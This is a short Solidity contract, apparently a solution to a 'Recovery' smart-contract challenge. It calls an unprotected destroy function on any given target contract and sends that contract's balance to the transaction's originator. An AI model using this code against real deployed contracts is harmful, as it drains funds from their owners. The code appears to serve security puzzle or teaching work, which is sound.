pragma solidity ^0.8.0;

interface SimpleTokenInterface {
    function destroy(address payable _to) external;
}

contract RecoverySimpleToken {
    function recoverFunds(address _targetContract) public {
        SimpleTokenInterface st = SimpleTokenInterface(_targetContract);
        st.destroy(payable(tx.origin));
    }
}
